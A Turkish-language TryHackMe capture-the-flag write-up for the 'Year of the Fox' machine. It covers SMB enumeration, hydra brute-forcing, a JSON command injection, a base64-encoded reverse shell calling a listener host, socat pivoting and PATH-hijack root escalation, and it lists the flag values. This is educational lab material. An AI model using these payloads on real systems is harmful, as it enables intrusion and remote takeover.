# 🦊 Year of the Fox — TryHackMe Çözümü (Writeup)

> **Yazar:** Miraç Akkuş (LatenT)
> **Tarih:** Mayıs 2026
> **Oda:** [Year of the Fox]()

---

## 🚩 Alınan Bayraklar (Flags)

| Bayrak | Konum | Değer |
| --- | --- | --- |
| **Web Flag** | `/var/www/web-flag.txt` | `THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}` |
| **User Flag** | `/home/fox/user-flag.txt` | `THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}` |
| **Root Flag** | `/home/rascal/.did-you-think-I-was-useless.root` | `THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}` |

---

## 📋 Özet

Bu rapor, **Year of the Fox** makinesinin ele geçirilme sürecini dökümante eder. Süreç; SMB üzerinden bilgi toplama, web arayüzünde komut enjeksiyonu (command injection), SSH tünelleme (pivoting) ve son olarak PATH hijacking yöntemiyle tam yetki (root) elde etme aşamalarından oluşmaktadır.

---

## 🔍 Aşama 1: Keşif ve Bilgi Toplama

### Ağ Taraması (Nmap)

```bash
nmap -sV -sC -T4 <HEDEF_IP>

```

**Önemli Bulgular:**

* **Port 80 (HTTP):** Apache sunucusu çalışıyor, "Basic Authentication" (Giriş paneli) var.
* **Port 139/445 (SMB):** Samba servisi açık. Kullanıcı listeleme yapılabilir.

### SMB Numaralandırma

`enum4linux` kullanarak sistemdeki kullanıcıları tespit ediyoruz:

* **Kullanıcılar:** `fox`, `rascal`

---

## 🌐 Aşama 2: Sisteme Giriş (Web Sızma)

### Kaba Kuvvet Saldırısı (Brute-Force)

SMB'den bulduğumuz `rascal` kullanıcısını web panelinde deniyoruz:

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt <HEDEF_IP> http-get /

```

**Sonuç:** `rascal:987321`

### Komut Enjeksiyonu (Command Injection)

Giriş yaptıktan sonra arama kutusunun JSON parametreleri üzerinden komut çalıştırdığı fark edildi.
**Zafiyetli İstek:**

```http
POST /assets/php/search.php HTTP/1.1
{"target":"\";whoami\n"}

```

Burada `grep` komutunu kırarak kendi komutlarımızı çalıştırabiliyoruz.

---

## 🐚 Aşama 3: Shell Bağlantısı

Kendi makinemizde bir dinleyici (listener) açıp ters shell (reverse shell) alıyoruz:

```bash
# Dinleyici
nc -nlvp 9001

# Payload (Base64 ile encode edilmiş bash shell)
{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEwNi4yMjIvOTAwMSAwPiYx | base64 -d | bash; \n"}

```

**Sonuç:** `www-data` kullanıcısı olarak shell alındı.

---

## 🔄 Aşama 4: İç Ağda Yayılma (Pivoting)

Sistemde `netstat -tulpn` komutunu çalıştırdığımızda SSH servisinin (22. port) sadece dışarıya kapalı, içeride (`127.0.0.1`) çalıştığını görüyoruz. `Socat` kullanarak bu portu dışarıya yönlendiriyoruz:

```bash
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22

```

Artık dışarıdan hedef IP'nin 2222. portuna SSH isteği atabiliriz. `fox` kullanıcısı için şifre kırma işlemi yapıyoruz:
**Sonuç:** `fox:<şifre>`

---

## 🚀 Aşama 5: Yetki Yükseltme (PrivEsc)

`sudo -l` komutuyla yetkilerimizi kontrol ettiğimizde:

* `fox` kullanıcısı, `/usr/sbin/shutdown` komutunu şifresiz ve root yetkisiyle çalıştırabiliyor.

### PATH Hijacking Saldırısı

`shutdown` komutu içeride `poweroff` komutunu tam yol (tam yol: `/sbin/poweroff`) belirtmeden çağırıyor. Bunu suistimal ediyoruz:

1. `/tmp` dizinine gidip içine bir `poweroff` dosyası oluşturuyoruz (içine `/bin/bash` yazıyoruz).
2. `chmod +x poweroff` ile yetki veriyoruz.
3. `export PATH=/tmp:$PATH` komutuyla sistemin önce bizim klasörümüze bakmasını sağlıyoruz.
4. `sudo /usr/sbin/shutdown` dediğimizde sistem bizim sahte dosyamızı root yetkisiyle çalıştırıyor.

**Sonuç:** `# root` shell alındı!

---

## 🏁 Aşama 6: Bayraklar ve Final

* **User Flag:** `/home/fox/user-flag.txt`
* **Root Flag:** `/home/rascal/.did-you-think-I-was-useless.root` (Yazar burada `/root` içine sahte bir bayrak koyarak bizi şaşırtmaya çalışmış!)

---

## 🛡️ Öneriler

1. Zayıf şifre kullanımından kaçınılmalı.
2. Web uygulamalarında kullanıcıdan alınan veri `system()` gibi fonksiyonlara doğrudan gönderilmemeli.
3. Sudo yetkileri tanımlanırken komutların tam yolları (`/usr/bin/command` gibi) belirtilmeli.

---

**Yazar:** Miraç Akkuş (LatenT)
**Not:** Bu rapor eğitim amaçlıdır.
